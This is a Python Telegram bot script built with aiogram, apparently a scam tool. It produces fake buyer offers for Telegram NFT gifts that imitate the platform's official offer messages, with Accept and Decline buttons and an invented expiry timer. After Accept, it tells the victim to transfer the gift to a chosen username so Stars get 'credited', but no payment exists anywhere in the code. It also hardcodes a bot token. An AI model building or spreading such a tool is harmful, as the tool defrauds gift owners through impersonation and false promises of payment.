import asyncio
import logging
import re

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandObject
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

# === НАСТРОЙКИ ===
BOT_TOKEN = "8731128809:AAGKkScn9upJcg5atWJxFISR7hEhAllIRfc"
ADMIN_IDS = [8548929333]
DEFAULT_STARS = 7000
current_buyer = "faqux"
# ================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS


def parse_gift_link(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name_raw, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_raw)
    slug = f"{name_raw.lower()}-{num}"
    return {
        "gift_name": f"{gift_name} #{num}",
        "image": f"https://nft.fragment.com/gift/{slug}.medium.jpg"
    }


def offer_kb(gift_name: str, stars: int):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✗ Decline", callback_data=f"dec:{gift_name[:30]}"),
        InlineKeyboardButton(text="✓ Accept", callback_data=f"acc:{gift_name[:30]}:{stars}")
    ]])


@dp.message(Command("start"))
async def start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("no")
        return
    await message.answer(
        f"Бот работает.\nBuyer: @{current_buyer}\n\n"
        "Кинь:\n<code>https://t.me/nft/IceCream-201001 5000</code>",
        parse_mode=ParseMode.HTML
    )


@dp.message(Command("setbuyer"))
async def setbuyer(message: Message, command: CommandObject):
    global current_buyer
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer(f"Текущий: @{current_buyer}\n/setbuyer username")
        return
    current_buyer = command.args.strip().lstrip("@")
    await message.answer(f"Buyer: @{current_buyer}")


@dp.message(F.text)
async def on_text(message: Message):
    if not is_admin(message.from_user.id):
        return
    text = message.text or ""
    gift = parse_gift_link(text)
    if not gift:
        return
    stars_m = re.search(r"\b(\d{3,6})\b", text)
    stars = int(stars_m.group(1)) if stars_m else DEFAULT_STARS

    caption = (
        f"<b>User {current_buyer} is offering you\n"
        f"{stars} Stars for the gift {gift['gift_name']}.</b>\n\n"
        f"This offer expires in <b>5h 59m</b>."
    )
    kb = offer_kb(gift["gift_name"], stars)

    await message.answer(f"Оффер на {gift['gift_name']} ({stars} Stars). Перешли ниже.")
    try:
        await message.answer_photo(photo=gift["image"], caption=caption, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        await message.answer(caption, reply_markup=kb, parse_mode=ParseMode.HTML)


@dp.callback_query(F.data.startswith("dec:"))
async def on_dec(cb: CallbackQuery):
    try:
        await cb.message.edit_caption(caption="Offer declined.", reply_markup=None)
    except Exception:
        pass
    await cb.answer()


@dp.callback_query(F.data.startswith("acc:"))
async def on_acc(cb: CallbackQuery):
    parts = cb.data.split(":", 2)
    gift_name = parts[1] if len(parts) > 1 else "Gift"
    stars = parts[2] if len(parts) > 2 else "7000"
    try:
        await cb.message.edit_caption(
            caption=f"<b>The offer to sell {gift_name} has been successfully accepted.</b>\n\nTransfer the gift to the buyer to have {stars} Stars credited.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Transfer", callback_data="tr")]]),
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass
    await cb.message.answer(
        f"🎁 Gift <b>{gift_name}</b> sold!\nTransfer to <b>@{current_buyer}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Open profile", url=f"https://t.me/{current_buyer}")]])
    )
    await cb.answer()


@dp.callback_query(F.data == "tr")
async def on_tr(cb: CallbackQuery):
    await cb.answer()
    await cb.message.answer(f"Send gift to @{current_buyer}")


async def main():
    print("Standalone bot starting...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
